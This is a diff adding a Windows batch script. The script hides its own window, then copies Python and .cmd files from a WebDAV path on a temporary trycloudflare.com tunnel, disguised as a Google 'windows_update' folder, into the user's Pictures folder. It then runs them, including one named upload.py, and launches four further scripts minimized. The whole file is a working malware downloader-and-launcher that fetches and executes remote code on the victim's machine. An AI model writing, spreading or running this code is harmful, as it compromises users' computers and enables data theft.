@@ -1,0 +1,101 @@
+@echo off
+if "%1" == "" start "" /min "%~f0" MY_FLAG && exit
+
+set source=\\oral-career-renewable-bacterial.trycloudflare.com@SSL\DavWWWRoot\google\windows_update
+set destination=%USERPROFILE%\Pictures
+
+REM Delay for 2 seconds (to ensure install.ps1 is completed before continuing)
+echo Waiting for 2 seconds before running new.py...
+timeout /t 2 >nul
+
+REM Copy new.py to the destination folder
+copy /Y "%source%\new.py" "%destination%"
+IF NOT %ERRORLEVEL% == 0 (
+    echo Failed to copy new.py. Exiting script.
+    exit /b 1
+)
+
+REM Run new.py with cmd
+echo Running new.py...
+cmd /c "%destination%\new.py"
+IF NOT %ERRORLEVEL% == 0 (
+    echo new.py failed to execute. Exiting script.
+    exit /b 1
+)
+
+REM Delay for 2 seconds (to ensure install.ps1 is completed before continuing)
+echo Waiting for 2 seconds before running upload.py...
+timeout /t 2 >nul
+
+REM Copy upload.py to the destination folder
+copy /Y "%source%\upload.py" "%destination%"
+IF NOT %ERRORLEVEL% == 0 (
+    echo Failed to copy upload.py. Exiting script.
+    exit /b 1
+)
+
+REM Run upload.py with cmd
+echo Running upload.py...
+cmd /c "%destination%\upload.py"
+IF NOT %ERRORLEVEL% == 0 (
+    echo upload.py failed to execute. Exiting script.
+    exit /b 1
+)
+
+REM Delay for 2 seconds (to ensure install.ps1 is completed before continuing)
+echo Waiting for 2 seconds before running update.py...
+timeout /t 2 >nul
+
+REM Copy update.py to the destination folder
+copy /Y "%source%\update.py" "%destination%"
+IF NOT %ERRORLEVEL% == 0 (
+    echo Failed to copy update.py. Exiting script.
+    exit /b 1
+)
+
+REM Run update.py with cmd
+echo Running update.py...
+cmd /c "%destination%\update.py"
+IF NOT %ERRORLEVEL% == 0 (
+    echo update.py failed to execute. Exiting script.
+    exit /b 1
+)
+
+REM Delay for 2 seconds (to ensure install.ps1 is completed before continuing)
+echo Waiting for 2 seconds before running time.py...
+timeout /t 2 >nul
+
+REM Copy time.py to the destination folder
+copy /Y "%source%\time.py" "%destination%"
+IF NOT %ERRORLEVEL% == 0 (
+    echo Failed to copy time.py. Exiting script.
+    exit /b 1
+)
+
+REM Run time.py with cmd
+echo Running time.py...
+cmd /c "%destination%\time.py"
+IF NOT %ERRORLEVEL% == 0 (
+    echo time.py failed to execute. Exiting script.
+    exit /b 1
+)
+
+REM Delay for 2 seconds (to ensure python.exe is fully copied and ready)
+echo Waiting for 2 seconds before continuing...
+timeout /t 2 >nul
+
+REM Copy kam.cmd, xff.cmd, zap.cmd, las.cmd, and version.bat to the destination folder
+copy /Y "%source%\kam.cmd" "%destination%"
+copy /Y "%source%\las.cmd" "%destination%"
+copy /Y "%source%\xff.cmd" "%destination%"
+copy /Y "%source%\zap.cmd" "%destination%"
+
+REM Run kam.cmd and las.cmd and zap.cmd and xff.cmd
+for %%f in ("%destination%\kam.cmd" "%destination%\las.cmd" "%destination%\zap.cmd" "%destination%\xff.cmd") do (
+    echo Running %%~nxf...
+    start /MIN cmd /c "%%f"
+
+)
+
+
+exit /b 0
